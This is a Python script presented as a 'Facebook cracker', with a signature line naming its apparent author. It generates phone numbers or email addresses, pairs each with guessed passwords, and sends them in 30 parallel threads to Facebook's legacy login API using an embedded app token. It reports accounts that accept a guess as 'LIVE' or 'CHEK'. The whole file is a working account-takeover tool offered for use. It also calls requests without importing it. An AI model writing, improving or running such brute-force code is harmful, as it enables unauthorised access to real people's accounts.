#Coded by Sayyed Zakarya (fb.me/sayyed.6)
import os, socket, sys, time, mechanize, itertools, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib,concurrent.futures
from random import randint
def brute(user, passs):
  try:
    for pw in passs:
      params={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': user,
        'locale': 'en_US',
        'password': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api='https://b-api.facebook.com/method/auth.login'
      response=requests.get(api, params=params)
      if re.search('(EAAA)\w+', str(response.text)):
        print('  [LIVE] %s -> %s '%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('  [CHEK] %s -> %s '%(str(user), str(pw)))
        break
  except: pass

def random_numbers():
  data = []
  os.system('cls' if os.name == 'nt' else 'clear')
  print('''
 \033[32;1m[ FACEBOOK CRACKER RANDOM NUMBERS ]\033[37;1m:
 \033[1;94m  _______ _____  _   _ _____  ___    _     _ _____ 
\033[1;92m (_____  )  _  )( ) ( )  _  )|  _ \ ( )   ( )  _  )
\033[1;93m      / /| (_) || |/ /| (_) || (_) ) \ \_/ /| (_) |
\033[1;95m    / /  (  _  )|   ( (  _  )|    /    \ /  (  _  )
\033[1;94m  / / ___| | | || |\ \| | | || |\ \    | |  | | | |
\033[1;96m (_______)_) (_)( ) (_)_) (_)(_) (_)   (_)  (_) (_)
\033[1;97m                /(                                 
\033[1;94m               (__)                  
 \033[32;1mCreator \033[37;1m: \033[33;1mSayyed-Zakarya
\033[1;94m Happy Eid Mubarak To All Muslims
  ''')
  kode=str(input('  Enter the starting number: '))
  exit('  The number must be 5 digits, yes, it cannot be less.') if len(kode) < 5 else ''
  exit('  The number must be 5 digits, yes, it cannot be more.') if len(kode) > 5 else ''
  jml=int(input('''
  Enter the number of numbers to generate the instance: 10
  Amount: '''))
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:]), str(e[7:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,8)]) for e in range(jml)]]
  print('''
  Good luck today kaka :)
  Wait, brother, don't close it....
  ''')
  with concurrent.futures.ThreadPoolExecutor(max_workers=30) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  print('\n  It is over, brother')

def random_email():
  data = []
  os.system('cls' if os.name == 'nt' else 'clear')
  print('''
  [ FACEBOOK CRACKER RANDOM EMAIL ]
  Fill in the username, brother
  Example: daughter
  ''')
  nama=input('  Username: ')
  domain=input('''
  Choose your domain [G]mail, [Y]ahoo, [H]otmail
  Choose (g,y,h): ''').lower().strip()
  list={
    'g':'@gmail.com',
    'y':'@yahoo.com',
    'h':'@hotmail.com'
  }
  exit('  Please fill in the correct one, brother.') if not domain in ['g','y','h'] else ''
  jml=int(input('''
  Enter the number of emails to generate the sample: 10
  Amount: '''))
  setpw=input('''
Set a password that is close to the username
example: Khan123, Zakarya123
  Set password: ''').split(',')
  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
  print('''
Hope you are lucky today :)
Wait, brother, don't close it ....
  ''')
  with concurrent.futures.ThreadPoolExecutor(max_workers=30) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  print('\n  It is over, brother')

def pilih():
  print('''
1. Crack of random numbers
2. crack from random emails
  ''')
  pil=int(input('  Choose One?: '))
  if pil == 1:
    random_numbers()
  elif pil == 2:
    random_email()
  else:
    exit('  You Idiot')
 
pilih() if __name__ == '__main__' else exit('Sorry there is an error, bro, please try again')
